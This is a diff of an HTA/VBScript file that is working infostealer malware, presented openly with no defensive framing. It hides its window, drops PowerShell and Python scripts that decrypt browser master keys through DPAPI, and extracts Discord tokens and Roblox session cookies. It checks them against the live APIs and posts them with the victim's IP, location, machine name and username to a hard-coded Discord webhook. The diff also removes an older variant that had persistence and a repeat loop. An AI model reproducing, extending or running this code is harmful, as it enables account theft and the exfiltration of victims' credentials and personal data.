@@ -2,320 +2,595 @@
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
 <script language="VBScript">
-window.resizeTo 0,0:window.moveTo -2000,-2000
-On Error Resume Next
 
-Dim sh, fso, PC, USER
+Dim sh, fso, WH, PC, USER
 Set sh  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-
-Const WH = "https://discord.com/api/webhooks/1564088097514192938/WWdT5daixn2xuoaab_9J-SS7xk4WknR0sFm3MKCkftffH8qC8dblrIpJVfv0mOds5V1d"
-
+WH   = "https://discord.com/api/webhooks/1564088097514192938/WWdT5daixn2xuoaab_9J-SS7xk4WknR0sFm3MKCkftffH8qC8dblrIpJVfv0mOds5V1d"
 PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- Main chain ---
-Call GrabTokens
-Call IP
-Call GrabRoblox
-Call GrabFroststrap
-Call Persistence
+' ─── error reporter ───────────────────────────────────────────────────────────
+Sub PostError(src, num, desc)
+    PostEmbed "[ERR] " & src, "Code: " & CStr(num) & Chr(10) & desc, 16711680
+End Sub
 
-' --- Re-run grab chain 8x every 10 min ---
-Dim i
-For i = 1 To 8
-    Call GrabTokens
-    Call IP
-    Call GrabRoblox
-    Call GrabFroststrap
-    If i < 8 Then Call SleepMinutes(10)
-Next
+' ─── entry ────────────────────────────────────────────────────────────────────
+Sub Window_OnLoad()
+    window.resizeTo 0, 0
+    window.moveTo -2000, -2000
+    IP()
+    GrabDiscord()
+    GrabRoblox()
+End Sub
 
-window.close()
-
-' ===================== SUBS =====================
-
+' ─── IP / geo ─────────────────────────────────────────────────────────────────
 Sub IP()
-    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    On Error GoTo 0
+    Dim xh, ip, ll, info
+    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
+
+    On Error Resume Next
     xh.Open "GET", "https://api.ipify.org/", False
     xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim ip: ip = Trim(xh.responseText)
-    If Len(ip) < 7 Then Exit Sub
+    If Err.Number <> 0 Then
+        PostError "IP/ipify-request", Err.Number, Err.Description
+        Set xh = Nothing : Exit Sub
+    End If
+    On Error GoTo 0
 
+    If xh.Status <> 200 Then
+        PostError "IP/ipify-status", xh.Status, "HTTP " & CStr(xh.Status)
+        Set xh = Nothing : Exit Sub
+    End If
+
+    ip = Trim(xh.responseText)
+    If Len(ip) < 7 Then
+        PostError "IP/parse", 0, "Response too short: '" & ip & "'"
+        Set xh = Nothing : Exit Sub
+    End If
+
+    On Error Resume Next
     xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
     xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim ll: ll = Split(xh.responseText, vbLf)
+    If Err.Number <> 0 Then
+        PostError "IP/geoip-request", Err.Number, Err.Description
+        Set xh = Nothing : Exit Sub
+    End If
+    On Error GoTo 0
+
+    If xh.Status <> 200 Then
+        PostError "IP/geoip-status", xh.Status, "HTTP " & CStr(xh.Status)
+        Set xh = Nothing : Exit Sub
+    End If
+
+    ll = Split(xh.responseText, vbLf)
+    If UBound(ll) < 3 Then
+        PostError "IP/geoip-parse", 0, "Fields missing. Raw: " & Left(xh.responseText, 200)
+        Set xh = Nothing : Exit Sub
+    End If
+
+    info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & _
+           " | PC: " & PC & " | USER: " & USER
+    PostEmbed "Target", info, 3447003
+    Set xh = Nothing
+End Sub
+
+' ─── discord token ────────────────────────────────────────────────────────────
+Sub GrabDiscord()
+    Dim psf, tf, ef, raw, errRaw
+    psf = TmpFile("dc_g.ps1")
+    tf  = TmpFile("dc_r.txt")
+    ef  = TmpFile("dc_e.txt")
+
+    SafeDel psf : SafeDel tf : SafeDel ef
+
+    Dim f
+    On Error Resume Next
+    Set f = fso.CreateTextFile(psf, True, False)
+    If Err.Number <> 0 Then
+        PostError "Discord/create-ps1", Err.Number, Err.Description : Exit Sub
+    End If
+    On Error GoTo 0
+
+    f.WriteLine "Add-Type -AssemblyName System.Security"
+    f.WriteLine "$token = $null"
+    f.WriteLine "$gcmOK = $false"
+    f.WriteLine "try { $null = [System.Security.Cryptography.AesGcm]; $gcmOK = $true } catch {}"
+    f.WriteLine ""
+    f.WriteLine "function Get-MK($base) {"
+    f.WriteLine "    try {"
+    f.WriteLine "        $ls = Join-Path $base 'Local State'"
+    f.WriteLine "        if (-not (Test-Path $ls)) { return $null }"
+    f.WriteLine "        $j  = [System.IO.File]::ReadAllText($ls) | ConvertFrom-Json"
+    f.WriteLine "        $ek = [Convert]::FromBase64String($j.os_crypt.encrypted_key)"
+    f.WriteLine "        return [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]$ek[5..($ek.Length-1)], $null, 'CurrentUser')"
+    f.WriteLine "    } catch { Write-Error ""Get-MK failed: $_""; return $null }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "function Dec-GCM($mk, $b) {"
+    f.WriteLine "    if (-not $gcmOK -or $null -eq $mk -or $b.Length -lt 31) { return $null }"
+    f.WriteLine "    try {"
+    f.WriteLine "        $nonce = [byte[]]$b[3..14]"
+    f.WriteLine "        $tag   = [byte[]]$b[($b.Length-16)..($b.Length-1)]"
+    f.WriteLine "        $ct    = [byte[]]$b[15..($b.Length-17)]"
+    f.WriteLine "        $out   = New-Object byte[] $ct.Length"
+    f.WriteLine "        $gcm   = [System.Security.Cryptography.AesGcm]::new([byte[]]$mk)"
+    f.WriteLine "        $gcm.Decrypt($nonce, $ct, $tag, $out)"
+    f.WriteLine "        $gcm.Dispose()"
+    f.WriteLine "        return [System.Text.Encoding]::UTF8.GetString($out)"
+    f.WriteLine "    } catch { return $null }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "function Valid-Token($t) {"
+    f.WriteLine "    if (-not $t) { return $false }"
+    f.WriteLine "    if ($t -match '^mfa\.[\w-]{84}$') { return $true }"
+    f.WriteLine "    if ($t -match '^[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}$') { return $true }"
+    f.WriteLine "    return $false"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "function Check-Token($t) {"
+    f.WriteLine "    try {"
+    f.WriteLine "        $wc = New-Object System.Net.WebClient"
+    f.WriteLine "        $wc.Headers.Add('Authorization', $t)"
+    f.WriteLine "        $wc.Headers.Add('Content-Type', 'application/json')"
+    f.WriteLine "        $r = $wc.DownloadString('https://discord.com/api/v9/users/@me')"
+    f.WriteLine "        $wc.Dispose()"
+    f.WriteLine "        return $r -match '""id""'"
+    f.WriteLine "    } catch { return $false }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "function Scan-File($path, $mk) {"
+    f.WriteLine "    try {"
+    f.WriteLine "        $bytes = [System.IO.File]::ReadAllBytes($path)"
+    f.WriteLine "        $txt   = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)"
+    f.WriteLine "        $rx1   = [regex]'dQw4w9WgXcQ:[A-Za-z0-9+/]{10,}={0,2}'"
+    f.WriteLine "        foreach ($m in $rx1.Matches($txt)) {"
+    f.WriteLine "            try {"
+    f.WriteLine "                $enc = [Convert]::FromBase64String($m.Value.Substring(12))"
+    f.WriteLine "                $dec = Dec-GCM $mk $enc"
+    f.WriteLine "                if ((Valid-Token $dec) -and (Check-Token $dec)) { return $dec }"
+    f.WriteLine "            } catch {}"
+    f.WriteLine "        }"
+    f.WriteLine "        $rx2 = [regex]'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,}'"
+    f.WriteLine "        foreach ($m in $rx2.Matches($txt)) {"
+    f.WriteLine "            if ((Valid-Token $m.Value) -and (Check-Token $m.Value)) { return $m.Value }"
+    f.WriteLine "        }"
+    f.WriteLine "        $rx3 = [regex]'mfa\.[\w-]{84}'"
+    f.WriteLine "        $m3  = $rx3.Match($txt)"
+    f.WriteLine "        if ($m3.Success -and (Check-Token $m3.Value)) { return $m3.Value }"
+    f.WriteLine "    } catch { Write-Error ""Scan-File $path : $_"" }"
+    f.WriteLine "    return $null"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "function Scan-Dir($ldb, $mk) {"
+    f.WriteLine "    if (-not (Test-Path $ldb)) { return $null }"
+    f.WriteLine "    $files = Get-ChildItem $ldb -File -EA SilentlyContinue |"
+    f.WriteLine "             Where-Object { $_.Extension -in '.ldb','.log' } |"
+    f.WriteLine "             Sort-Object LastWriteTime -Descending"
+    f.WriteLine "    foreach ($file in $files) {"
+    f.WriteLine "        $t = Scan-File $file.FullName $mk"
+    f.WriteLine "        if ($t) { return $t }"
+    f.WriteLine "    }"
+    f.WriteLine "    return $null"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "foreach ($app in @('discord','discordcanary','discordptb','discorddevelopment')) {"
+    f.WriteLine "    if ($token) { break }"
+    f.WriteLine "    $base = Join-Path $env:APPDATA $app"
+    f.WriteLine "    if (-not (Test-Path $base)) { continue }"
+    f.WriteLine "    $mk   = Get-MK $base"
+    f.WriteLine "    $t    = Scan-Dir (Join-Path $base 'Local Storage\leveldb') $mk"
+    f.WriteLine "    if ($t) { $token = $t }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "if (-not $token) {"
+    f.WriteLine "    foreach ($br in @("
+    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'),"
+    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data'),"
+    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data'),"
+    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Opera Software\Opera Stable'),"
+    f.WriteLine "        (Join-Path $env:LOCALAPPDATA 'Vivaldi\User Data')"
+    f.WriteLine "    )) {"
+    f.WriteLine "        if ($token) { break }"
+    f.WriteLine "        if (-not (Test-Path $br)) { continue }"
+    f.WriteLine "        $mk    = Get-MK $br"
+    f.WriteLine "        $profs = @('Default') + @(Get-ChildItem $br -Directory -Filter 'Profile *' -EA SilentlyContinue | Select-Object -ExpandProperty Name)"
+    f.WriteLine "        foreach ($p in $profs) {"
+    f.WriteLine "            if ($token) { break }"
+    f.WriteLine "            $t = Scan-Dir (Join-Path $br ""$p\Local Storage\leveldb"") $mk"
+    f.WriteLine "            if ($t) { $token = $t }"
+    f.WriteLine "        }"
+    f.WriteLine "    }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "if ($token) { $token | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
+    f.WriteLine "else { 'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
+
+    f.Close : Set f = Nothing
+
+    ' run — stderr → ef
+    On Error Resume Next
+    sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """ 2>""" & ef & """", 0, True
+    If Err.Number <> 0 Then
+        PostError "Discord/run-ps1", Err.Number, Err.Description
+        SafeDel psf : Exit Sub
+    End If
+    On Error GoTo 0
+    SafeDel psf
+
+    ' surface PS errors
+    If fso.FileExists(ef) Then
+        errRaw = Trim(ReadFile(ef))
+        SafeDel ef
+        If Len(errRaw) > 0 Then PostFile "discord_ps_errors.txt", errRaw
+    End If
+
+    If Not fso.FileExists(tf) Then
+        PostError "Discord/no-output", 0, "Result file missing after PS run"
+        Exit Sub
+    End If
+
+    raw = Trim(ReadFile(tf))
+    SafeDel tf
+
+    If raw = "NOT_FOUND" Or Len(raw) = 0 Then
+        PostEmbed "Discord", "NOT_FOUND on " & PC & " (" & USER & ")", 8421504
+    ElseIf Len(raw) > 10 Then
+        PostFile "discord_token.txt", raw
+    Else
+        PostError "Discord/token-short", 0, "Unexpected output: " & Left(raw, 100)
+    End If
+End Sub
+
+' ─── roblox cookie ────────────────────────────────────────────────────────────
+Sub GrabRoblox()
+    Dim psf, tf, ef, raw, errRaw
+    psf = TmpFile("rblx_g.ps1")
+    tf  = TmpFile("rblx_r.txt")
+    ef  = TmpFile("rblx_e.txt")
+
+    SafeDel psf : SafeDel tf : SafeDel ef
+
+    Dim f
+    On Error Resume Next
+    Set f = fso.CreateTextFile(psf, True, False)
+    If Err.Number <> 0 Then
+        PostError "Roblox/create-ps1", Err.Number, Err.Description : Exit Sub
+    End If
+    On Error GoTo 0
+
+    f.WriteLine "Add-Type -AssemblyName System.Security"
+    f.WriteLine "$cookie = $null"
+    f.WriteLine ""
+    f.WriteLine "function Clean-Cookie($raw) {"
+    f.WriteLine "    $c = ($raw -replace '[\r\n\t ]','').Split(';')[0]"
+    f.WriteLine "    $i = $c.IndexOf('_|WARNING')"
+    f.WriteLine "    if ($i -gt 0) { $c = $c.Substring($i) }"
+    f.WriteLine "    if ($c -match '_\|WARNING|ROBLOSECURITY') { return $c }"
+    f.WriteLine "    return $null"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "foreach ($rp in @("
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\robloxcookies.dat'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\LocalStorage\RobloxCookies.dat'),"
+    f.WriteLine "    (Join-Path $env:LOCALAPPDATA 'Roblox\Cookies'),"
+    f.WriteLine "    (Join-Path $env:APPDATA      'Roblox\LocalStorage\robloxcookies.dat')"
+    f.WriteLine ")) {"
+    f.WriteLine "    if ($cookie -or -not (Test-Path $rp)) { continue }"
+    f.WriteLine "    try {"
+    f.WriteLine "        $raw = [System.IO.File]::ReadAllText($rp)"
+    f.WriteLine "        try {"
+    f.WriteLine "            $j = $raw | ConvertFrom-Json"
+    f.WriteLine "            $j.PSObject.Properties | Where-Object { $_.Value -is [string] -and $_.Value.Length -gt 80 } | ForEach-Object {"
+    f.WriteLine "                if ($cookie) { return }"
+    f.WriteLine "                try {"
+    f.WriteLine "                    $ek  = [Convert]::FromBase64String($_.Value)"
+    f.WriteLine "                    $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($ek, $null, 'CurrentUser')"
+    f.WriteLine "                    $str = [System.Text.Encoding]::UTF8.GetString($dec)"
+    f.WriteLine "                    $c   = Clean-Cookie $str"
+    f.WriteLine "                    if ($c) { $cookie = $c }"
+    f.WriteLine "                } catch { Write-Error ""DPAPI decrypt failed: $_"" }"
+    f.WriteLine "            }"
+    f.WriteLine "        } catch { Write-Error ""JSON parse failed for $rp : $_"" }"
+    f.WriteLine "        if (-not $cookie) { $cookie = Clean-Cookie $raw }"
+    f.WriteLine "    } catch { Write-Error ""Read failed $rp : $_"" }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "if (-not $cookie) {"
+    f.WriteLine "    $pkgs = Join-Path $env:LOCALAPPDATA 'Packages'"
+    f.WriteLine "    if (Test-Path $pkgs) {"
+    f.WriteLine "        Get-ChildItem $pkgs -Directory -EA SilentlyContinue | Where-Object { $_.Name -match 'ROBLOX' } | ForEach-Object {"
+    f.WriteLine "            if ($cookie) { return }"
+    f.WriteLine "            foreach ($fn in @('LocalState\RobloxCookies.dat','LocalState\robloxcookies.dat','LocalState\Cookies')) {"
+    f.WriteLine "                $uwp = Join-Path $_.FullName $fn"
+    f.WriteLine "                if (-not (Test-Path $uwp)) { continue }"
+    f.WriteLine "                try {"
+    f.WriteLine "                    $c = Clean-Cookie ([System.IO.File]::ReadAllText($uwp))"
+    f.WriteLine "                    if ($c) { $cookie = $c; break }"
+    f.WriteLine "                } catch { Write-Error ""UWP read failed $uwp : $_"" }"
+    f.WriteLine "            }"
+    f.WriteLine "        }"
+    f.WriteLine "    }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "if (-not $cookie) {"
+    f.WriteLine "    $py = (Get-Command python -EA SilentlyContinue)"
+    f.WriteLine "    if (-not $py) { $py = (Get-Command python3 -EA SilentlyContinue) }"
+    f.WriteLine "    if ($py) {"
+    f.WriteLine "        $pyPath = Join-Path $env:TEMP 'rblx_ck.py'"
+    f.WriteLine "        $pyScript = @'"
+    f.WriteLine "import sqlite3,os,shutil,ctypes,base64,json,sys"
+    f.WriteLine "class B(ctypes.Structure):"
+    f.WriteLine "    _fields_=[('cb',ctypes.c_ulong),('pb',ctypes.POINTER(ctypes.c_char))]"
+    f.WriteLine "def dpapi(d):"
+    f.WriteLine "    i=B(len(d),ctypes.cast(ctypes.create_string_buffer(d),ctypes.POINTER(ctypes.c_char)));o=B()"
+    f.WriteLine "    if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(i),None,None,None,None,0,ctypes.byref(o)):return bytes(ctypes.string_at(o.pb,o.cb))"
+    f.WriteLine "    return None"
+    f.WriteLine "def get_mk(b):"
+    f.WriteLine "    ls=os.path.join(b,'Local State')"
+    f.WriteLine "    if not os.path.exists(ls):return None"
+    f.WriteLine "    try:"
+    f.WriteLine "        j=json.load(open(ls,'r',encoding='utf-8'));ek=base64.b64decode(j['os_crypt']['encrypted_key']);return dpapi(ek[5:])"
+    f.WriteLine "    except Exception as e:print(f'get_mk err: {e}',file=sys.stderr);return None"
+    f.WriteLine "def dec_ck(mk,enc):"
+    f.WriteLine "    if not mk or len(enc)<32:return None"
+    f.WriteLine "    try:"
+    f.WriteLine "        from cryptography.hazmat.primitives.ciphers.aead import AESGCM"
+    f.WriteLine "        return AESGCM(mk).decrypt(enc[3:15],enc[15:],None).decode('utf-8','replace')"
+    f.WriteLine "    except Exception as e:print(f'dec_ck err: {e}',file=sys.stderr);return None"
+    f.WriteLine "def query_db(path,mk):"
+    f.WriteLine "    tmp=path+'.tmp'"
+    f.WriteLine "    try:"
+    f.WriteLine "        shutil.copy2(path,tmp);cn=sqlite3.connect(tmp)"
+    f.WriteLine "        row=cn.execute(""SELECT value,encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'"").fetchone()"
+    f.WriteLine "        cn.close();os.unlink(tmp)"
+    f.WriteLine "        if not row:return None"
+    f.WriteLine "        return row[0] if row[0] else dec_ck(mk,row[1])"
+    f.WriteLine "    except Exception as e:"
+    f.WriteLine "        print(f'query_db err {path}: {e}',file=sys.stderr)"
+    f.WriteLine "        try:os.unlink(tmp)"
+    f.WriteLine "        except:pass"
+    f.WriteLine "    return None"
+    f.WriteLine "cookie=None;LA=os.path.expandvars('%LOCALAPPDATA%')"
+    f.WriteLine "for br in[os.path.join(LA,'Google','Chrome','User Data'),os.path.join(LA,'Microsoft','Edge','User Data'),os.path.join(LA,'BraveSoftware','Brave-Browser','User Data')]:"
+    f.WriteLine "    if cookie:break"
+    f.WriteLine "    if not os.path.exists(br):continue"
+    f.WriteLine "    mk=get_mk(br)"
+    f.WriteLine "    try:profs=['Default']+[d for d in os.listdir(br) if d.startswith('Profile ')]"
+    f.WriteLine "    except:profs=['Default']"
+    f.WriteLine "    for prof in profs:"
+    f.WriteLine "        if cookie:break"
+    f.WriteLine "        for ckn in['Cookies',os.path.join('Network','Cookies')]:"
+    f.WriteLine "            ck=os.path.join(br,prof,ckn)"
+    f.WriteLine "            if not os.path.exists(ck):continue"
+    f.WriteLine "            cookie=query_db(ck,mk)"
+    f.WriteLine "            if cookie:break"
+    f.WriteLine "for ck in[os.path.join(LA,'Roblox','EBWebView','EBWebView','Default','Network','Cookies'),os.path.join(LA,'Roblox','EBWebView','EBWebView','Default','Cookies')]:"
+    f.WriteLine "    if cookie:break"
+    f.WriteLine "    if not os.path.exists(ck):continue"
+    f.WriteLine "    cookie=query_db(ck,None)"
+    f.WriteLine "print(cookie if cookie else 'NOT_FOUND')"
+    f.WriteLine "'@"
+    f.WriteLine "        [System.IO.File]::WriteAllText($pyPath,$pyScript,[System.Text.Encoding]::UTF8)"
+    f.WriteLine "        $pyCk=(& $py.Source $pyPath 2>`$null | Out-String).Trim()"
+    f.WriteLine "        Remove-Item $pyPath -EA SilentlyContinue"
+    f.WriteLine "        if ($pyCk -and $pyCk -ne 'NOT_FOUND') { $cookie = $pyCk }"
+    f.WriteLine "        else { Write-Error ""Python path: no cookie found"" }"
+    f.WriteLine "    } else { Write-Error ""Python not found on PATH"" }"
+    f.WriteLine "}"
+    f.WriteLine ""
+    f.WriteLine "if ($cookie) { $cookie | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
+    f.WriteLine "else { 'NOT_FOUND' | Out-File '" & tf & "' -Encoding utf8 -NoNewline }"
+
+    f.Close : Set f = Nothing
+
+    On Error Resume Next
+    sh.Run "cmd /c powershell -NoP -NonI -Exec Bypass -File """ & psf & """ 2>""" & ef & """", 0, True
+    If Err.Number <> 0 Then
+        PostError "Roblox/run-ps1", Err.Number, Err.Description
+        SafeDel psf : Exit Sub
+    End If
+    On Error GoTo 0
+    SafeDel psf
+
+    If fso.FileExists(ef) Then
+        errRaw = Trim(ReadFile(ef))
+        SafeDel ef
+        If Len(errRaw) > 0 Then PostFile "roblox_ps_errors.txt", errRaw
+    End If
+
+    If Not fso.FileExists(tf) Then
+        PostError "Roblox/no-output", 0, "Result file missing after PS run"
+        Exit Sub
+    End If
+
+    raw = Trim(ReadFile(tf))
+    SafeDel tf
+
+    If raw = "NOT_FOUND" Or Len(raw) = 0 Then
+        PostEmbed "Roblox", "NOT_FOUND on " & PC & " (" & USER & ")", 8421504
+    ElseIf Len(raw) > 10 Then
+        PostFile "roblox_cookie.txt", raw
+        GrabRobloxInfo raw
+    Else
+        PostError "Roblox/cookie-short", 0, "Unexpected output: " & Left(raw, 100)
+    End If
+End Sub
+
+' ─── roblox info embed ────────────────────────────────────────────────────────
+Sub GrabRobloxInfo(cookie)
+    Dim xh, json, uinfo, uid, uname, robux, premium, created, ageDays, rapVal, createdDate
+
+    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+
+    On Error Resume Next
+    xh.Open "GET", "https://www.roblox.com/mobileapi/userinfo", False
+    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+    xh.Send
+    If Err.Number <> 0 Then
+        PostError "RobloxInfo/userinfo-request", Err.Number, Err.Description
+        Set xh = Nothing : Exit Sub
+    End If
+    On Error GoTo 0
+
+    If xh.Status <> 200 Then
+        PostError "RobloxInfo/userinfo-status", xh.Status, "HTTP " & CStr(xh.Status)
+        Set xh = Nothing : Exit Sub
+    End If
+
+    json    = xh.responseText
+    uid     = RegexFirst(json, """UserID"":(\d+)")
+    uname   = RegexFirst(json, """UserName"":""([^""]+)""")
+    robux   = RegexFirst(json, """RobuxBalance"":(\d+)")
+    premium = RegexFirst(json, """IsPremium"":(true|false)")
+
+    If uid = "" Then
+        PostError "RobloxInfo/uid-parse", 0, "UID not found in: " & Left(json, 200)
+        Set xh = Nothing : Exit Sub
+    End If
+    If robux   = "" Then robux   = "0"
+    If premium = "" Then premium = "false"
+
+    On Error Resume Next
+    xh.Open "GET", "https://users.roblox.com/v1/users/" & uid, False
+    xh.Send
+    On Error GoTo 0
+
+    ageDays = "?"
+    If xh.Status = 200 Then
+        uinfo   = xh.responseText
+        created = RegexFirst(uinfo, """created"":""([^T]+)")
+        If created <> "" Then
+            On Error Resume Next
+            createdDate = CDate(created)
+            If Err.Number = 0 Then ageDays = CStr(DateDiff("d", createdDate, Now()))
+            If Err.Number <> 0 Then ageDays = "parse-err:" & Err.Description
+            On Error GoTo 0
+        End If
+    Else
+        ageDays = "req-fail:" & CStr(xh.Status)
+    End If
+
+    ' RAP
+    rapVal = "0"
+    On Error Resume Next
+    xh.Open "GET", "https://inventory.roblox.com/v1/users/" & uid & "/assets/collectibles?limit=100", False
+    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+    xh.Send
+    On Error GoTo 0
+
+    If xh.Status = 200 Then
+        Dim rapJson : rapJson = xh.responseText
+        Dim rapSum  : rapSum  = 0
+        Dim pos     : pos     = 1
+        Dim key     : key     = """recentAveragePrice"":"
+        Dim p, numStr, ch
+        Do
+            p = InStr(pos, rapJson, key)
+            If p = 0 Then Exit Do
+            p = p + Len(key)
+            numStr = ""
+            Do While p <= Len(rapJson)
+                ch = Mid(rapJson, p, 1)
+                If ch >= "0" And ch <= "9" Then
+                    numStr = numStr & ch : p = p + 1
+                Else
+                    Exit Do
+                End If
+            Loop
+            If numStr <> "" Then
+                On Error Resume Next
+                rapSum = rapSum + CLng(numStr)
+                If Err.Number <> 0 Then Err.Clear
+                On Error GoTo 0
+            End If
+            pos = p
+        Loop
+        rapVal = CStr(rapSum)
+    Else
+        rapVal = "req-fail:" & CStr(xh.Status)
+    End If
+
     Set xh = Nothing
 
-    Dim info: info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | User: " & USER
-    Call PostEmbed("Target", info, 3447003)
+    Dim nl : nl = Chr(10)
+    Dim embedDesc
+    embedDesc = "**Username** | **Age** | **PC**" & nl
+    embedDesc = embedDesc & uname & " | " & ageDays & " Days | " & PC & nl & nl
+    embedDesc = embedDesc & "**Robux** | **Premium** | **RAP**" & nl
+    embedDesc = embedDesc & robux & " | " & premium & " | " & rapVal & nl & nl
+    embedDesc = embedDesc & "**Cookie**" & nl & "``Check attached file``"
+
+    PostEmbed "Roblox Hit", embedDesc, 65280
 End Sub
 
-Sub GrabTokens()
-    ' Inline PS1 — no external fetch dependency
-    Dim ps: ps = _
-        "$out=@();" & _
-        "$regex='[\w-]{24}\.[\w-]{6}\.[\w-]{25,}';" & _
-        "$mfa='mfa\.[\w-]{84}';" & _
-        "$paths=@(" & _
-            "[IO.Path]::Combine($env:APPDATA,'discord','Local Storage','leveldb')," & _
-            "[IO.Path]::Combine($env:APPDATA,'discordcanary','Local Storage','leveldb')," & _
-            "[IO.Path]::Combine($env:APPDATA,'discordptb','Local Storage','leveldb')," & _
-            "[IO.Path]::Combine($env:LOCALAPPDATA,'Google','Chrome','User Data','Default','Local Storage','leveldb')," & _
-            "[IO.Path]::Combine($env:LOCALAPPDATA,'Microsoft','Edge','User Data','Default','Local Storage','leveldb')," & _
-            "[IO.Path]::Combine($env:LOCALAPPDATA,'BraveSoftware','Brave-Browser','User Data','Default','Local Storage','leveldb')," & _
-            "[IO.Path]::Combine($env:APPDATA,'Opera Software','Opera Stable','Local Storage','leveldb')" & _
-        ");" & _
-        "$seen=@{};" & _
-        "foreach($dir in $paths){" & _
-            "if(!(Test-Path $dir)){continue};" & _
-            "Get-ChildItem $dir -File -ErrorAction SilentlyContinue|foreach{" & _
-                "try{$raw=[IO.File]::ReadAllText($_.FullName)}catch{continue};" & _
-                "$tokens=[regex]::Matches($raw,$mfa)+[regex]::Matches($raw,$regex);" & _
-                "foreach($m in $tokens){" & _
-                    "$t=$m.Value;" & _
-                    "if($seen[$t]){continue};$seen[$t]=1;" & _
-                    "try{" & _
-                        "$h=@{Authorization=$t};" & _
-                        "$r=Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers $h -EA Stop;" & _
-                        "$phone=if($r.phone){$r.phone}else{''};" & _
-                        "$email=if($r.email){$r.email}else{''};" & _
-                        "$out+='DISCORD|'+$r.username+'#'+$r.discriminator+'|'+$email+'|'+$phone+'|'+$r.id+'|'+$t" & _
-                    "}catch{}" & _
-                "}" & _
-            "}" & _
-        "};" & _
-        "$robloxPaths=@(" & _
-            "[IO.Path]::Combine($env:LOCALAPPDATA,'Roblox','LocalStorage','robloxcookies.dat')," & _
-            "[IO.Path]::Combine($env:LOCALAPPDATA,'Roblox','LocalStorage','RobloxCookies.dat')," & _
-            "[IO.Path]::Combine($env:APPDATA,'Roblox','LocalStorage','robloxcookies.dat')" & _
-        ");" & _
-        "foreach($rp in $robloxPaths){" & _
-            "if(Test-Path $rp){" & _
-                "try{$rc=[IO.File]::ReadAllText($rp);if($rc.Length -gt 50){$out+='ROBLOX|'+$rc}}catch{}" & _
-            "}" & _
-        "};" & _
-        "if($out.Count -eq 0){exit};" & _
-        "$outFile=[IO.Path]::Combine($env:TEMP,'steal_result.txt');" & _
-        "$out|Out-File $outFile -Encoding utf8"
-
-    Dim psf: psf = TmpPath("steal.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
-    fso.DeleteFile psf, True
-
-    Dim rf: rf = TmpPath("steal_result.txt")
-    If Not fso.FileExists(rf) Then Exit Sub
-    Dim raw: raw = ReadFile(rf)
-    fso.DeleteFile rf, True
-
-    Dim lines: lines = Split(raw, vbLf)
-    Dim ln
-    For Each ln In lines
-        ln = Trim(ln)
-        If Len(ln) < 10 Then GoTo NextLine
-
-        If Left(ln, 8) = "DISCORD|" Then
-            Dim parts: parts = Split(Mid(ln, 9), "|")
-            If UBound(parts) >= 4 Then
-                Dim body: body = "User: " & parts(0) & vbCrLf
-                If parts(1) <> "" Then body = body & "Email: " & parts(1) & vbCrLf
-                If parts(2) <> "" Then body = body & "Phone: " & parts(2) & vbCrLf
-                If parts(3) <> "0" And parts(3) <> "" Then body = body & "ID: " & parts(3) & vbCrLf
-                body = body & "Token: " & parts(4)
-                Call PostEmbed("Discord Token", body, 5793266)
-            End If
+' ─── helpers ──────────────────────────────────────────────────────────────────
+Function RegexFirst(src, pattern)
+    Dim rx : Set rx = CreateObject("VBScript.RegExp")
+    rx.Pattern = pattern
+    rx.IgnoreCase = True
+    Dim m : Set m = rx.Execute(src)
+    If m.Count > 0 Then
+        If m(0).SubMatches.Count > 0 Then
+            RegexFirst = m(0).SubMatches(0)
+        Else
+            RegexFirst = m(0).Value
         End If
+    Else
+        RegexFirst = ""
